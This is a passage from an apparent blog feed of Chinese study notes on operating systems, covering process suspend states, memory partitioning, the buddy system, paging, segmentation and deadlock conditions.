class=""><ul><li>操作系统从就绪队列中选择进程执行</li><li>当一个正在运行的程序被移出处理器时：终止or被放在就绪或阻塞队列中</li><li>当一个事件发生时，<strong>所有</strong>位于<strong>阻塞队列</strong>中等待该事件的进程都被放到<strong>就绪队列</strong>中</li><li>一些好的方案：<ul><li>同时有多个队列，一个事件对应一个队列（b）</li><li>每个优先级一个队列，操作系统可以很容易确定哪个就绪进程具有最高优先级且等待时间最长</li></ul></li></ul></li></ul><h3 id="3-2-4被挂起的程序">3.2.4被挂起的程序</h3><ul><li><p>机器变得复杂的原因是，I/O活动远慢于计算速度=》单道程序系统中的处理器大多数处于空闲状态，多道程序系统中也可能出现这种情况</p></li><li><p>解决：</p><ul><li>扩充内存来容纳更多的进程<ul><li>贵</li><li>程序对内存空间需求的增长速度快于内存价格下降的速度</li></ul></li><li>交换<ul><li>把内存中某个进程的一部分或全部移到磁盘中</li><li>当内存中<strong>不存在就绪态</strong>的进程时，操作系统就把<strong>被阻塞</strong>的进程换出到磁盘中的<strong>挂起队列（<em>suspend queue</em>）</strong>，即临时从内存中&quot;踢出&quot;的进程队列。操作系统此后要么从<strong>挂起队列</strong>中取出另一个进程，要么接受一个<strong>新进程的请求</strong>，将其放入内存运行。When none of the processes in main memory is in the  Ready state, the OS swaps one of the blocked processes out on to disk into a suspend queue. This is a queue of existing processes that have been temporarily kicked  out of main memory, or suspended</li><li>交换也是I/O操作，但是磁盘I/O一般是系统中最快地I/O，因此交换通常会提高性能</li></ul></li></ul></li><li><p><strong>挂起态（<em>the Suspend state</em>）</strong></p><ul><li><p>当内存中的<strong>所有进程</strong>都处于<strong>阻塞态</strong>时，操作系统可把其中的一个进程置为<strong>挂起态</strong>，并将它转移到<strong>磁盘</strong>，此时内存所释放的空间就可被<strong>调入的另一个进程</strong>使用</p></li><li><p>操作系统执行换出操作后，将进程取到内存中的方式有两种：接纳一个新近创建的进程，或调入一个此前挂起的进程。</p></li><li><p>操作系统倾向于调入一个此前挂起的进程，并为它提供服务，而非增加系统的总负载数</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E5%92%8C%E6%8E%A7%E5%88%B6%EF%BC%88%E4%B8%8A%EF%BC%89/os3.9a.jpg" class=""></li><li><p>两个独立的概念：阻塞与否，挂起与否（是否被换出内存）</p><ul><li>就绪态：进程已经在内存中并且可以执行</li><li>阻塞态：进程已经在内存中并且等待一个事件</li><li>阻塞/挂起态：进程在外存中并且等待一个事件</li><li>就绪/挂起态：进程已经在外存中，但只要载入内存就可以执行</li></ul></li><li><p>注意迄今为止的论述都假设未使用虚存，进程要么都在内存中，要么都在内存外。使用虚存中，可能会执行只有部分内容在内存中的进程，若访问的进程地址不在内存中，则将进程的相应部分调入内存。使用虚存看上去不需要显式交换，因为通过处理器中的存储管理硬件。任何进程中的任何地址都可移入或移出内存。然而，如第8 意所述，若活动进程很多，且所有的进程都有一部分在内存中时，则可能会导致虚存系统崩溃。因此，即使是在虚存系统中，操作系统也需要不时地根据执行情况完全显式地换出进程</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E5%92%8C%E6%8E%A7%E5%88%B6%EF%BC%88%E4%B8%8A%EF%BC%89/os3.9b.jpg" class=""><ul><li>阻塞→阻塞/挂起<ul><li>若没有就绪进程，<u>则至少换出一个阻塞进程</u>，以便为另一个未阻塞进程腾出<strong>空间</strong></li><li>即使有可用的就绪态进程，也能完成这种转换</li><li>若操作系统需要<strong>确定当前正运行的进程</strong>，或就绪进程为了<strong>维护基本的性能</strong>而需要更多的内存空间，则会挂起一个阻塞的进程</li></ul></li><li>阻塞/挂起→就绪/挂起<ul><li>若<strong>等待的事件发生</strong>，则处于阻塞/挂起态的进程可转换到就绪/挂起态</li><li>注意，此时要求操作系统必须得到<strong>挂起进程的状态信息</strong></li></ul></li><li>就绪/挂起→就绪<ul><li>若内存中没有就绪态进程，则操作系统需要调入一个进程继续执行</li><li>此外，处于<strong>就绪/挂起态</strong>的进程与处于<strong>就绪态</strong>的任何进程相比，优先级更高时，也可进行这种转换</li><li>出现这种情况的原因是，操作系统设计者规定，调入高优先级的进程比减少交换量更重要</li></ul></li><li>就绪→就绪/挂起<ul><li>若释放内存来得到足够空间的<u>唯一方法</u>是挂起一个就绪态进程，则这种转换也是必需的</li><li>此外，若操作系统确信高优先级的阻塞态进程很快将会就绪，则它可能会选择挂起一个低优先级的就绪态进程，而非一个高优先级的阻塞态进程</li></ul></li><li>新建→就绪/挂起和新建→就绪<ul><li>new==》就绪or就绪/挂起</li><li>操作系统建立一些表=》管理进程，并为进程<strong>分配地址空间</strong></li><li>操作系统可能更倾向于在<strong>初期</strong>执行这些辅助工作，以便能<u>维护大量的未阻塞进程</u></li><li>采用这种策略时，经常出现无足够空间分配给新进程的情况，因此使用了&quot;新建→就绪/挂起&quot;转换</li><li>建进程的<strong>适时（just-in-time）原理</strong>：即尽可能<strong>推迟创建进程</strong>以<strong>减少操作系统的开销</strong>，并在系统被阻塞态进程<strong>阻塞</strong>时，允许操作系统执行<strong>进程创建</strong>任务。</li></ul></li><li>阻塞/挂起→阻塞<ul><li>在设计中少见</li><li>一个进程终止后，会释放一些内存空间，而阻塞/挂起队列中有一个进程的优先级要比就绪/挂起队列中任何进程的优先级都高，并且操作系统有理由相信阻塞进程的事件很快就会发生。这时，把阻塞进程而非就绪进程调入内存是合理的</li></ul></li><li>运行→就绪/挂起<ul><li>通常当一个运行进程的分配时间到期后，它将转换到就绪态</li><li>但在阻塞/挂起队列中具有<strong>较高优先级</strong>的进程不再被阻塞时，操作系统会<strong>抢占</strong>这个进程，或直接把这个运行进程转换到就绪/挂起队形中，并<strong>释放一些内存空间</strong></li></ul></li><li>各种状态→退出</li></ul></li></ul></li><li><p>挂起进程的特点</p><ul><li>该进程不能立即执行</li><li>该进程可能在也可能不在等待一个事件。若在等待一个事件，那么<u>阻塞条件不依赖于挂起条件</u>，阻塞事件的发生不会使进程立即执行</li><li>为<strong>阻止</strong>该进程执行，可通过代理使其置于挂起态，代理可以是<strong>进程本身</strong>，也可以是<strong>父进程</strong>或<strong>操作系统</strong></li><li>除非代理<strong>显式</strong>地命令系统进行状态转换，否则该进程无法从这一状态转移</li></ul></li><li><p>进程挂起的原因</p><table><thead><tr><th>事件</th><th>说明</th></tr></thead><tbody><tr><td>内存分配的需要</td><td>提供更多的内存空间以便调入一个就绪/挂起态进程，或增加分配给其他就绪态进程的内存</td></tr><tr><td>交换</td><td>操作系统需要释放足够的内存空间，以调入并执行处于就绪态的进程</td></tr><tr><td>其他 OS 原因</td><td>操作系统可能挂起后台进程或工具程序进程，或挂起可能会导致问题的进程</td></tr><tr><td>交互式用户请求</td><td>用户希望挂起一个程序的执行，以便进行调试或关联资源的使用</td></tr><tr><td>定时</td><td>进程可被周期性地执行（如记账或系统监视进程），并在等待下一个时间间隔时挂起</td></tr><tr><td>父进程请求</td><td>父进程可能会希望挂起后代进程的执行，以检查或修改挂起的进程，或协调不同后代进程之间的行为</td></tr></tbody></table><ul><li>若用户怀疑程序有缺陷，就可挂起执行程序进行<strong>调试</strong>，检查并修改程序或数据，然后恢复执行</li><li>在一个<strong>收集印迹或记账</strong>的后台程序时，用户可能希望能够打开或关闭这个程序</li><li><strong>分时因素</strong>的影响：若一个周期性激活的进程多数时间是空闲的，则在两次用到它的时间间隔期内，应把它换出（如监视<u>使用情况或用户活动</u>的程序）</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第七章-内存管理（二）</title>
    <link href="/2024/02/20/%E7%AC%AC%E4%B8%83%E7%AB%A0%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%862/"/>
    <url>/2024/02/20/%E7%AC%AC%E4%B8%83%E7%AB%A0%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%862/</url>
    
    <content type="html"><![CDATA[<h1>7.3 分页</h1><ul><li><p>进程中称为页（page）的块可以分配到内存中称为页框（frame） 的可用块</p></li><li><p>使用分页技术时，每个进程在内存中浪费的空间，仅是进程最后一页的一小部分形成的内部碎片</p></li><li><p>没有任何外部碎片</p></li><li><p>内存中某些页框是<strong>空闲</strong>的，操作系统维护空闲页框的<strong>列表</strong></p></li><li><p>例</p><ul><li><p>存储在磁盘上的进程A由4页组成。装入这个进程时，操作系统查找<u>4个</u>空闲页框，并将进程A的4页装入这4个页框中</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%83%E7%AB%A0%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%862/os1.jpg" class=""></li><li><p>B、C进—》B被挂起，并被换出内存—》内存中的所有进程被阻塞，OS需要新进程D换入（由5页组成）</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%83%E7%AB%A0%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%862/os2.jpg" class=""></li></ul></li><li><p>页表按页号对进程的所有页进行索引</p></li><li><p>操作系统为当前内存中<strong>未被占用、可供使用</strong>的<strong>所有页框</strong>维护一个<strong>空闲页框列表</strong></p><img src="/2024/02/20/%E7%AC%AC%E4%B8%83%E7%AB%A0%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%862/os3.jpg" class=""></li><li><p>采用分页技术的分区<u>相当小</u>，一个程序可以占据多个分区，并且这些分区<u>不需要是连续的</u></p></li><li><p>规定页和页框的大小必须是2的幂，以便容易地表示出相对地址</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%83%E7%AB%A0%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%862/os5.jpg" class=""></li><li><p>例</p><ul><li><p>考虑一个n+m位的地址，最左边的n位是页号，最右边的m位是偏移量</p></li><li><p>地址转换步骤∶</p><ul><li><p>提取页号，即逻辑地址最左侧的n位</p></li><li><p>以这个页号为索引，查找进程页表中相应的页框号k</p></li><li><p>页框的起始物理地址为k×2^m^，被访问字节的物理地址是这个数加上偏移量。物理地址不需 要计算，可以简单地把偏移量附加到页框号后面来构建物理地址</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%83%E7%AB%A0%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%862/os4.jpg" class=""></li></ul></li></ul></li><li><p>装入一个进程时，其所有页都装入可用页框中，并建立一个页表</p></li></ul><h1>7.4 分段</h1><ul><li>可以把程序和与其相关的数据划分到几个段（segment）中</li><li>分段技术时的逻辑地址也由两部分组成∶ 段号和偏移量</li><li>由于使用大小不等的段，分段类似于动态分区</li><li>在未采用覆盖方案或使用虚存的情况下，为执 行一个程序，需要把它的<strong>所有段</strong>都装入<strong>内存</strong></li><li>与动态分区不同的是，在分段方案中，一个程序可以占据多个分区，并且这些分区不要求是连续的</li><li>分段消除了内部碎片，但是和动态分区一样，它会 产生外部碎片。不过由于进程被分成多个小块，因此外部碎片也会很小</li><li>用大小不等的段的另一个结果是，逻辑地址和物理地址间不再是简单的对应关系</li><li>在简单的分段方案中，每个进程都有一个段表，系统也会维护一个内存中的空闲块列表</li><li>每个段表项必须给出相应段在内存中的起始地址，还必须<strong>指明段的长度</strong>，以确保不会使用无效地址</li><li>当进程进入运行状态时，系统会把其<strong>段表的地址</strong>装载到一个<strong>寄存器</strong>中，由内存管理硬件来使用这个寄存器</li><li>例<ul><li>考虑一个n+m 位的地址，最左侧的n位是段号，最侧的m位是偏移量</li><li>进行地址转换需要以下步骤<ul><li>提取段号，即逻辑地址最左侧的n位</li><li>以这个段号为索引，查找进程段表中该段的起始物理地址</li><li>最右侧 m 位表示偏移量，偏移量和段长度进行比较，若偏移量大于段长度，则该地址无效</li><li>物理地址为该段的起始物理地址与偏移量之和</li><li><img src="/2024/02/20/%E7%AC%AC%E4%B8%83%E7%AB%A0%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%862/os6.jpg" class=""></li><li><img src="/2024/02/20/%E7%AC%AC%E4%B8%83%E7%AB%A0%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%862/os7.jpg" class=""></li></ul></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第七章-内存管理（一）</title>
    <link href="/2024/02/20/%E7%AC%AC%E4%B8%83%E7%AB%A0%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <url>/2024/02/20/%E7%AC%AC%E4%B8%83%E7%AB%A0%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
    
    <content type="html"><![CDATA[<ul><li><p>在单道程序设计系统中，内存划分为两部分</p><ul><li>一部分供<strong>操作系统</strong>使用（驻留监控程序、内核）</li><li>另 一部分供当前<strong>正在执行的程序使用</strong></li></ul></li><li><p>在多道程序设计系统中</p><ul><li>必须在内存中进一步细分出&quot;用户&quot;部分， 以满足多个进程的要求</li><li>细分的任务由操作系统<strong>动态</strong>完成，这称为<strong>内存管理（memory management）</strong></li></ul></li><li><p>如果只有少量进程在内存中，那么所有进程大部分时间都用来等待I/O，这种情况下处理器也处于空闲状态</p></li><li><p>必须有效地分配内存来保证适当数量的就绪进程能占用这些可用的处理器时间</p></li><li><p>内存管理术语</p><table><thead><tr><th>术语</th><th>说明</th></tr></thead><tbody><tr><td>页框</td><td>内存中固定长度的块</td></tr><tr><td>页</td><td>固定长度的数据块，存储在二级存储器中（如磁盘）。数据页可以临时复制到内存的页框中</td></tr><tr><td>段</td><td>变长数据块，存储在二级存储器中。整个段可以临时复制到内存的一个可用区域中（分段），或可以将一个段分为许多页，然后将每页单独复制到内存中（分段与分页相结合）</td></tr></tbody></table></li></ul><h1>7.1 内存管理的需求</h1><p>内存管理的需求</p><ul><li>重定位</li><li>逻辑组织</li><li>保护</li><li>物理组织</li><li>共享</li></ul><h3 id="7-1-1-重定位">7.1.1 重定位</h3><ul><li><p>在多道程序设计系统中，可用的内存空间通常被多个进程共享</p></li><li><p>程序换出到磁盘中后， 下次换入时要放到与换出前相同的内存区域中会很困难，我们需要把进程**重定位（relocate）**到内存的不同区域</p></li><li><p>不知道程序会放到哪个区域，并且我们必须允许程序通过交换技术在内存中移动=》与寻址相关的技术问题</p></li></ul><h3 id="7-1-2-保护">7.1.2 保护</h3><ul><li><p>必须在运行时检查进程产生的所有内存访问，以确保它们只访问分配给该进程的内存空间</p></li><li><p>通常，用户进程不能访问操作系统的任何部分，不论是程序还是数据</p><p>一个进程中的程序通常不能跳转到另一个进程中的指令</p><p>若无特别许可，一个进程中的程序不能访问其他进程的数据区</p><p>=》处理器必须能在执行时终止这样的指令</p></li><li><p>内存保护需求必须由处理器（硬件）而非操作系统（软件）来满足（不可预测，费时）</p></li></ul><h3 id="7-1-3-共享">7.1.3 共享</h3><h3 id="7-1-4-逻辑组织">7.1.4 逻辑组织</h3><h3 id="7-1-5-物理组织">7.1.5 物理组织</h3><h1>7.2 内存分区</h1><ul><li><p>内存管理的主要操作是处理器把程序装入内存中执行</p></li><li><p>内存管理技术</p><table><thead><tr><th>技术</th><th>说明</th><th>优势</th><th>弱点</th></tr></thead><tbody><tr><td>固定分区</td><td>在系统生成阶段，内存被划分成许多静态分区。进程可装入大于等于自身大小的分区中</td><td>实现简单，只需要极少的操作 实现简单，只需要极少的操作系统开销</td><td>由于有内部碎片，对内存的使用不充分;活动进程的最大数量是固定</td></tr><tr><td>动态分区</td><td>分区是动态创建的，因而每个进程可装入与自身大小正好相等的分区中</td><td>没有内部碎片;可以更充分地使用内存</td><td>由于需要压缩外部碎片， 处理器利用率低</td></tr><tr><td>简单分页</td><td>内存被划分成许多大小相等的页框;每个进程被划分成许多大小与页框相等的页;要装入一个进程，需要把进程包含的所有页都装入内存内不一定连续的某些页框中</td><td>没有外部碎片</td><td>有少量的内部碎片</td></tr><tr><td>简单分段</td><td>每个进程被划分成许多段;要装入一个进程，需要把进程包含的所有段都装入内存内不一定连续的某些动态分区中</td><td>有内部碎片，相对于动态分区，减少 了开销</td><td>存在外部碎片</td></tr><tr><td>虚存分页</td><td>除了不需要装入一个进程的所有页外，与简单分页一样;非驻留页在以后需要时自动调入内存</td><td>没有外部碎片，支持更多道数的多道程序设计;巨大的虚拟地址空间</td><td>复杂的内存管理开销</td></tr><tr><td>虚存分段</td><td>除了不需要装入一个进程的所有段外，与简单分段一样;非驻留段在以后需要时自动调入内存</td><td>没有内部碎片;支持更多道数的多道程序设计;巨大的虚拟地址空间;支持保护和共享</td><td>复杂的内存管理开销</td></tr></tbody></table></li></ul><h3 id="7-2-1-固定分区">7.2.1 固定分区</h3><h6 id="分区大小">分区大小</h6><ul><li><p>使用大小相等的分区</p><ul><li>若所有的分区都已满，且没有进程处于<strong>就绪态或运行态</strong>，则操作系统可以换出一个进程的所有分区，并装入另一个进程</li><li>难点<ul><li>程序可能太大而不能放到一个分区中<ul><li>必须使用<strong>覆盖</strong>技术设计程序，使得在任何时候<u>该程序只有一部分需要放到内存中</u></li><li>当需要的模块不在时，用户程序必须把这个模块装入程序的分区， 覆盖该分区中的任何程序和数据</li></ul></li><li>内存的<strong>利用率</strong>非常低<ul><li>任何程序，即使很小，都需 要占据一个完整的分区</li><li><strong>内部碎片（internal fragmentation）</strong>：由于装入的数据块<u>小于分区大小</u>，因而导致<strong>分区内部</strong>存在空间浪费</li></ul></li></ul></li></ul></li><li><p>使用大小不等的分区</p><ul><li><p>可缓解问题但不能解决，产生的内部碎片更少</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%83%E7%AB%A0%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/os7.2.jpg" class=""></li><li><p>优点</p><ul><li>一定的灵活性</li></ul></li></ul></li></ul><h6 id="放置算法">放置算法</h6><p>对于大小不等的分区策略，把进程分配到分区有两种方法</p><ul><li><p>把每个进程分配到<u>能够容纳它的<strong>最小分区</strong>中</u>（每个分区一个进程队列）</p><ul><li><p>每个分区都需要维护一个调度队列，用于保存从这个分区换出的进程</p></li><li><p>优点</p><ul><li>若所有进程都按这种方式分配，则可使每个分区内部浪费的空间**（内部碎片）最少**</li></ul><p>（从单个分区的角度来看这种技术是最优的，从整个系统来看不是最佳的）</p></li></ul></li><li><p>为所有进程只提供一个队列</p><ul><li>当需要把一个进程装入内存时，选择可以容纳该进程的最小可用分区。如果所有的分区都已被占据，则必须进行交换</li><li>换出因素考虑：<ul><li>一般优先考虑换出能容纳新进程的最小分区中的进程</li><li>优先级</li><li>也可以优先选择换出被阻塞的进程而非就绪进程</li></ul></li></ul></li><li><p>优点</p><ul><li>固定分区方案相对比较<strong>简单</strong>，只需要很小的操作系统软件和处理开销</li></ul></li><li><p>缺点</p><ul><li>分区的数量在系统生成阶段已经确定，因而限制了系统中活动（未挂起）进程的数量</li><li>由于分区的大小是在系统生成阶段事先设置的，因而小作业不能有效地利用分区空间<ul><li>在事先知道所有作业的内存需求的情况下，这种方法也许是合理的，但大多数情况下这种技术非常低效</li></ul></li></ul></li><li><p>例子：早期的IBM主机操作系统OS/MFT（Multiprogramming with a Fixed Number of Tasks，具有固定任务数的多道程序设计系统）</p></li></ul><h3 id="7-2-2-动态分区">7.2.2 动态分区</h3><ul><li><p>例子：IBM 主机操作系统 OS/MVT （Multiprogramming with a Variable Number of Tasks，具有可变任务数的多道程序设计系统）</p></li><li><p>分区长度和数量可变</p></li><li><p>进程装入内存时，系统会给它分配一块与其所需容量<strong>完全相等</strong>的内存空间</p></li><li><p><strong>外部碎片（external fragmentation）<strong>在所有</strong>分区外</strong>的存储空间变成了越来越多的碎片</p></li><li><p>随着时间的推移，内存中形成了越来越多的碎片，内存的利用率随之下降</p><p>==》压缩（compaction）-&gt;移动-&gt;连续</p></li><li><p>压缩的问题：</p><ul><li>费时，会浪费处理器时间</li><li>需要动态重定位的能力<ul><li>必须能够把程序从内存的一块区域移动到另一块区域，且不会使程序中的内存访问无效</li></ul></li></ul></li></ul><h6 id="放置算法-2">放置算法</h6><ul><li><p>把一个进程装入或换入内存时，如果内存中有多个足够大的空闲块，那 么操作系统必须确定要为此进程分配哪个空闲块</p></li><li><p>算法（都在内存中选择大于等于进程的空闲块）</p><ul><li>最佳适配（Best-fit）<ul><li>选择与要求大小最接近的块</li><li>通常性能却是最差的<ul><li>使得内存中很快形成许多小到无法满足任何内存分配请求的小块</li><li>与其他算法相比，它需要更频繁地进行内存压缩</li></ul></li></ul></li><li>首次适配（first-fit）<ul><li>从头开始扫描内存，选择大小足够的第一个可用块</li><li>是最简单的，而且通常也<strong>是最好和最快</strong>的</li><li>使得内存的前端出现很多小空闲分区，并且每当进行首次适配查找时，都要经过这些分区</li></ul></li><li>下次适配（Next-fit）<ul><li>从上一次放置的位置开始扫描内存，选择下一个大小足够的可用块</li><li>通常要比首次适配的结果差，且常常会在内存的<strong>末尾</strong>分配空间，<u>导致通常位于存储空间末尾的最大空闲存储块很快分裂为小碎片</u></li><li>可能需要更多次数的压缩</li></ul></li></ul></li></ul><h6 id="置换算法">置换算法</h6><p>为避免由于等待一个活动进程解除阻塞状态引起的处理器时间浪费，操作系统将把一个阻塞的进程换出内存， 给新进程或处于就绪-挂起态的进程让出空间</p><h3 id="7-2-3-伙伴系统">7.2.3 伙伴系统</h3><ul><li><p>固定分区：限制了活动进程的数量，且如果可用分区的大小与进程大小很不匹配，那么内存空间的利用率就会非常低</p></li><li><p>动态分区：维护特别复杂，并且会引入进行压缩的额外开销</p></li><li><p>伙伴系统：折中方案</p></li><li><p>伙伴系统中可用内存块的大小为 2^k^个字，L≤K≤U，其中2^L^表示分配的最小块的尺寸，2^U^表示分配的最大块的尺寸，通常2^U^是可供分配的整个内存的大小</p></li><li><p>若请求的大小s满足2^U-1^ ＜s ≤ 2^U^，则分配整个空间，否则该块分成两个大小相等的伙伴，大小均为2^U-1^</p></li><li><p>在任何时候，伙伴系统中为所有大小为2^i^的&quot;空洞&quot;维护 一个列表。空洞可通过对半分裂从i+1列表中移出，并在i列表中产生两个大小为2^i^的伙伴</p></li><li><p>当i列表中的一对伙伴都变成未分配的块时，将它们从i列表中移出，合并为i+1列表中的一个块</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">get_hole</span> <span class="hljs-params">(<span class="hljs-type">int</span> i)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(i == (U + <span class="hljs-number">1</span>))&lt;failure&gt;;<br><span class="hljs-keyword">if</span>(&lt;i <span class="hljs-built_in">list</span> empty&gt;)&#123;<br>get <span class="hljs-title function_">hole</span><span class="hljs-params">(i + <span class="hljs-number">1</span>)</span>;<br>&lt;split hole into buddies&gt;;<br>&lt;put buddies on i_list&gt;;<br>    &#125;<br>&lt;take first hole on i <span class="hljs-built_in">list</span>&gt;;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2024/02/20/%E7%AC%AC%E4%B8%83%E7%AB%A0%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/os7.6.jpg" class=""><img src="/2024/02/20/%E7%AC%AC%E4%B8%83%E7%AB%A0%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/os7.7.jpg" class=""><ul><li>叶节点表示内存中的当前分区， 若两个伙伴都是叶节点，则至少须分配出去一个，否则它们将合并为一个更大的块</li></ul><h3 id="7-2-4-重定位">7.2.4 重定位</h3><ul><li><p>逻辑地址（logical address）</p><ul><li>与当前数据在内存中的物理分配 地址无关的访问地址，在执行对内存的访问之前必须把它转换为物理地址</li></ul></li><li><p>相对地址（relative address）</p><ul><li>逻辑地址的一个特例，它是相对于某些已知点（通常是程序的开始处）的存储单元</li></ul></li><li><p>物理地址（physical address）或绝对地址</p><ul><li>数据在内存中的实际位置</li></ul></li><li><p>系统采用运行时动态加载的方式把使用<strong>相对地址</strong>的程序加载到内存</p></li><li><p>基址寄存器，其内容是程序在内存中的起始地址</p></li><li><p>界限寄存器指明程序的终止位置</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%83%E7%AB%A0%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/os7.8.jpg" class=""><ul><li>使得程序可以在执行过程中被换入和换出内存</li><li>还提供了一种保护∶每个进程映像根据基址和界限寄存器的内容隔离，以免受到其他进程的越权访问</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第六章-死锁和饥饿</title>
    <link href="/2024/02/20/%E7%AC%AC%E5%85%AD%E7%AB%A0%E5%B9%B6%E5%8F%91%EF%BC%9A%E6%AD%BB%E9%94%81%E5%92%8C%E9%A5%A5%E9%A5%BF/"/>
    <url>/2024/02/20/%E7%AC%AC%E5%85%AD%E7%AB%A0%E5%B9%B6%E5%8F%91%EF%BC%9A%E6%AD%BB%E9%94%81%E5%92%8C%E9%A5%A5%E9%A5%BF/</url>
    
    <content type="html"><![CDATA[<h1>6.1 死锁原理</h1><ul><li>死锁定义为一组<u>相互竞争系统资源</u>或<u>进行通信</u>的进程间的**&quot;永久&quot;阻塞**</li><li>当一组进程中的每个进程都在等待某个事件（典型情况下是等待释放所请求的资源），而仅有这组进程中被阻塞的其他进程才可触发该事件时，就称这组进程发生了死锁</li><li>永久性</li></ul><h3 id="6-1-1-可重用资源">6.1.1 可重用资源</h3><ul><li><p>资源通常分为两类∶ 可重用资源、可消耗资源</p></li><li><p>可重用资源是指<strong>一次仅供一个进程安全使用</strong>且<strong>不因使用而耗尽</strong>的资源</p></li><li><p>进程：得到→使用→释放</p></li><li><p>例子：处理器、I/O通道、内存和外存、设备，以及诸如文件、数据库和信号量之类的数据结构</p></li><li><p>可重用资源死锁的例子</p><ul><li><p>相互竞争的两个进程都要独占访问<strong>磁盘文件D</strong>和<strong>磁带设备T</strong>，每个进程都占用一个资源并请求另一个资源时，就会发生死锁</p></li><li><p>内存请求</p><ul><li></li><li><p>假设可用的分配空间为200KB</p><table><thead><tr><th>P1</th><th>P2</th></tr></thead><tbody><tr><td>…</td><td>…</td></tr><tr><td>请求80KB</td><td>请求70KB</td></tr><tr><td>…</td><td>…</td></tr><tr><td>请求60KB</td><td>请求80KB</td></tr></tbody></table></li><li><p>两个进程都行进到它们的第二个请求时，就会发生死锁→解决：虚存</p></li></ul></li></ul></li></ul><h3 id="6-1-2-可消耗资源">6.1.2 可消耗资源</h3><ul><li>可消耗资源是指可**被创建（生产）<strong>和</strong>销毁（消耗）**的资源<ul><li>可消耗资源的数量通常没有限制</li><li>无阻塞生产进程可以创建任意数量的这类资源</li><li>消费进程得到个资源时，该资源就不再存在</li></ul></li><li>例子：中断、信号、消息和 I/O缓冲区中的信息</li></ul><table><thead><tr><th>P1</th><th>P2</th></tr></thead><tbody><tr><td>…</td><td></td></tr><tr><td>Receive(P2)</td><td>Receive(P1)</td></tr><tr><td>…</td><td>…</td></tr><tr><td>Send(P2,M1)</td><td>Send(P1,M2)</td></tr></tbody></table><ul><li>不存在解决所有类型死锁的有效策略</li><li>操作系统中死锁检测、预防和避免方法小结</li></ul><table><thead><tr><th>原则</th><th>资源分配策略</th><th>不同的方案</th><th>主要优点</th><th>主要缺点</th></tr></thead><tbody><tr><td>预防</td><td>保守：预提交资源</td><td>一次性请求所有资源</td><td>对执行一连串活动的进程非常有效<br />不需要抢占</td><td>低效<br />延迟进程的初始化<br />必须知道将来的资源请求</td></tr><tr><td>-</td><td></td><td>抢占</td><td>用于状态易于保存和恢复的资源时非常方便</td><td>过于经常地、没必要地抢占</td></tr><tr><td>-</td><td></td><td>资源排序</td><td>通过编译时检测是可以实施的<br />既然问题已在系统设计时解决，因此不需要在运行时计算</td><td>禁止增加的资源请求</td></tr><tr><td>避免</td><td>介于检测和预防中间</td><td>操作以便发现至少一条安全路径</td><td>不需要抢占</td><td>必须知道将来的资源请求<br />进程不能被长时间阻塞</td></tr><tr><td>检测</td><td>非常自由∶只要有可能，请求的资源都允许</td><td>周期性地调用以便测试死锁</td><td>不会延迟进程的初始化<br />易于在线处理</td><td>固有的抢占丢失</td></tr></tbody></table><h3 id="6-1-3-资源分配图">6.1.3 资源分配图</h3><img src="/2024/02/20/%E7%AC%AC%E5%85%AD%E7%AB%A0%E5%B9%B6%E5%8F%91%EF%BC%9A%E6%AD%BB%E9%94%81%E5%92%8C%E9%A5%A5%E9%A5%BF/os2.jpg" class=""><h3 id="6-1-4-死锁的条件">6.1.4 死锁的条件</h3><ul><li><p>三个<strong>必要条件</strong>（死锁存在的必要条件而非充分条件）</p><p>:one:<strong>互斥</strong></p><p>一次只有一个进程可以使用一个资源</p><p>其他进程不能访问已分配给其他进程的资源</p><p>（要确保结果的一致性和数据库的完整性）</p><p>:two:<strong>占有且等待</strong></p><p>当一个进程等待其他进程时，继续占有已分配的资源</p><p>:three:<strong>不可抢占</strong></p><p>不能强行抢占进程已占有的资源</p><p>（在涉及数据资源时，必须提供<strong>回滚恢复机制</strong>（rollback recovery mechanism）来支持资源抢占，只有这样才能把进程及其资源恢复到以前的适当状态，使得进程最终可以重复其动作）</p></li><li><p>要产生死锁，还需要第四个条件∶</p><p>:four:<strong>循环等待</strong>。</p><p>存在一个<strong>闭合的进程链</strong>，每个进程至少占有此链中下一个进程所需的一个资源</p></li></ul><table><thead><tr><th>死锁的可能性</th><th>死锁的存在性</th></tr></thead><tbody><tr><td>1、互斥<br />2、不可抢占<br />3、占有且等待</td><td>1、互斥<br />2、不可抢占<br />3、占有且等待<br 